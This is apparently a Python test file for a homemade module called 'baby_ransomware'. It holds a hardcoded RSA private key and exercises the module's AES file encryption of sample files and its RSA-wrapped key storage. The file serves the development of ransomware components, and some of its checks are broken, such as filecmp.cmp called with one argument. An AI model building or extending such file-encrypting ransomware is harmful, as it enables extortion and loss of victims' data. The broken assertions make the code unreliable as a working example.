from baby_ransomware import *
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import filecmp

aes_key = get_random_bytes(32)
aes_iv = get_random_bytes(AES.block_size)
rsa_private_key_str = '''
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyIge8UVqxEy9FAzShyGPWKoVcu6BlNVMyleceHc4+fwZG4cn
9UxhPDwJ+LGCrCeRh8Qd7Pirlit66ZOTDTC88H7vbiwFpmJ3clonRA4BDQ/YSBtx
JIPLJiMAZ5N7NIG25AyaBATznhLviWRZyfi0ZSAsFbzNUm67ljb7jw4YDmv2UNx1
tLt4VqpBNKTjANu1RrB9uPhQZhrXdkbxBPljAaP4E/XATdsgSru/o+ZUE9ABEwo4
w18nc+G3rvePVrxFVoV2ISsaeJZnEpzBhsefsDmedsvh+rnNZXH8NS1a0TyXpMHO
bzb5v3FwA4vYvO0M+LsQ8bxpSw50GCt3ZYtVJwIDAQABAoIBAAW7q97L/u8ZHo1p
3G7+l6GPo0iuPEgsB6Oqo4+SIQU3SY8kQGaJRie5s7NHfUE8vwgO+agNEqLFdXXO
FqCEPzKaU8VmPsxwo5JCX5MDhNDXHiDZn/93lnbtqJT4KMfp2Xe69dWdlUrJ/Hfa
GvMPnYtdQxq6qMgYNbFoEFhuV7kPHNOv9QE1NP7d4gZgLzmHTGi65iklSaJCva7v
TWq7mQ2mQvLGTT9ZiztKHdIPnMMApEkOypFdzIfiNy5r4EJf5BI8JdB9nL9NhisD
FWF521HrQ0eTgBvzx3bnRVjYle3+Y3z466EbIQh5lGwZkgB0sGcNiiht2PRdE1NE
+2UR8uECgYEA3yj8Bg1wKdDsjMfVbbFi/6WuEBqz+H8NBYOESXqLv1whRp2UrrGY
5LwDv+kQozFwQWIjLnt0UpOKRwcTaB4BSxRdjXhr8IvyirVcTA1Eoc9OMaZf8JF8
0O9h6eXPvQ/CCpKEWxq5EW+HJeVOvvNOgNSfPZD/LPfjKKG6VOf/lzECgYEA5gqq
0/aaHV70Xy2FmIJc+2XObrSFoygVnZ4Y0fuCwU6dtb0S9WvIjVSxvpQQSLu+WU4E
YDMwwT6yYa0TSe/ixGin4RpRyAR3wYLtbMpdTz/6+UrTu+09ENzMrbA+81gMLcpc
s8U+uDoPyS7FoFHKhCkgWerq3QTgMMXIQoAYS9cCgYEA1dSCsRX9TMQ5daghtQsN
DmNmB15e5pRvGMJtZq766zDPXceu6TmZhEs32JLtc0HzC2OKzIZU7q8bB3YbPV/K
43MvNViXLRYcIJcpSmJISjfG+EIwmeX+UIGgM6wWQ1WvG8xK8LUJclCIkmJH8yZW
KZISx76BFEiurIdTcPogaXECgYBitScR5pnAipL/GBBgHWf6c3e9pvZEyRllVYY+
69XyTmJ7rhKpfkNC6ZmPNgc6vlxyA3j7Mlv0P4vZP6OsMSOztVh7zYhT9B7SyPRJ
nxekvsZZG9N4qtZuGuA0kxCf6CLprxBSDwvXjwphABHKte3ZAbChBJ0ck1ADfYpt
hntmZwKBgQCUIIG952KJnn3AYed7DgIcHi8wmZBD5wacmoWWA9SmjWZrEBAA6onm
ua95gl6r4IEeQ/b3V+wgGRh3PI97NllXI5DdBAzvJSG4TdqCtxRDN1hR7zpO8mlF
XKECMagNBMSjvDYPVobRhZVMBYhjKDuAk0z4WH7yIdLoV7/zLYAFpA==
-----END RSA PRIVATE KEY-----
'''
rsa_public_key_str = '''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyIge8UVqxEy9FAzShyGP
WKoVcu6BlNVMyleceHc4+fwZG4cn9UxhPDwJ+LGCrCeRh8Qd7Pirlit66ZOTDTC8
8H7vbiwFpmJ3clonRA4BDQ/YSBtxJIPLJiMAZ5N7NIG25AyaBATznhLviWRZyfi0
ZSAsFbzNUm67ljb7jw4YDmv2UNx1tLt4VqpBNKTjANu1RrB9uPhQZhrXdkbxBPlj
AaP4E/XATdsgSru/o+ZUE9ABEwo4w18nc+G3rvePVrxFVoV2ISsaeJZnEpzBhsef
sDmedsvh+rnNZXH8NS1a0TyXpMHObzb5v3FwA4vYvO0M+LsQ8bxpSw50GCt3ZYtV
JwIDAQAB
-----END PUBLIC KEY-----
'''
rsa_public_key = RSA.import_key(rsa_public_key_str.strip())
rsa_private_key = RSA.import_key(rsa_private_key_str.strip())

p1 = pad('abc'.encode('utf8'))
assert len(p1) == AES.block_size

u1 = unpad(p1)
assert u1 == 'abc'.encode('utf8')

p2 = pad('abc'.encode('utf8'))
c1 = aes_encrypt(aes_key, aes_iv, p2)
p3 = aes_decrypt(aes_key, aes_iv, c1)
assert unpad(p3) == 'abc'.encode('utf8')

aes_encrypt_file(aes_key, aes_iv, 'sample.jpg', 'sample.jpg.enc')
aes_decrypt_file(aes_key, aes_iv, 'sample.jpg.enc')
assert filecmp.cmp('sample.jpg')

aes_encrypt_file(aes_key, aes_iv, 'sample.txt', 'sample.txt.enc')
aes_decrypt_file(aes_key, aes_iv, 'sample.txt.enc')
assert filecmp.cmp('sample.txt')

save_local_key(aes_key, aes_iv, rsa_public_key, 'LocalKey')
loaded_aes_key, loaded_aes_iv = load_local_key(rsa_private_key, 'LocalKey')
assert loaded_aes_key == aes_key
assert loaded_aes_iv == aes_iv
